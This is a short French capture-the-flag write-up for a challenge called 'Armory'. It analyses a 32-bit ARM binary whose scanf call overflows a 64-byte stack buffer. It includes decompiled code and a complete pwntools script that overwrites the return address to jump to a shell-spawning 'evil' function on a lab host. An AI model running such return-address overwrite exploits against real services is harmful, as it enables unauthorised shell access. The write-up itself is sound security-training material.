# Armory 

On nous donne un file armory pour tester notre exploit avant de le tenter avec netcat.

```bash
$ file armory
armory: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=aaa2d5ba6d3a6cf3958eb9073e673795c2f1e24e, not stripped
```

et quand on le lance : 
```bash
Hello, what's your name?
test
Hello test!
```

On sent le buffer overflow arrivé. Je lance ghidra et j'analyse le programme.

Voici la fonction main:
```c
undefined4 main(void)
{
  undefined auStack72 [64];
  
  puts("Hello, what\'s your name?");
  fflush((FILE *)0x0);
  __isoc99_scanf(&DAT_00010678,auStack72);
  printf("Hello %s!\n",auStack72);
  fflush((FILE *)0x0);
  return 0;
}
```

Un scanf dans un buffer de 64 bytes, le voilà notre buffer overflow. 

De plus, on remarque la fonction evil : 
```c
int evil(void)
{
  int iVar1;
  
  iVar1 = system("/bin/dash");
  return iVar1;
}
```
On récupère l'addresse de cette fonction: 0001052c

et on construit notre payload: 64\*A pour remplir notre buffer, 4\*B pour écrire au-dessus du base pointer et enfin notre adresse \x2c\x05\x01\x00 ! 

```python 
import pwn

def exploit():
    conn = pwn.remote("172.25.106.194",4000)
    while conn.can_recv(timeout=1):
        conn.sendlineafter("Hello, what's your name?\n","A"*68+"\x2c\x05\x01\x00")
        conn.interactive()

exploit()
```

Et on peut récupérer tranquillement le flag ! 

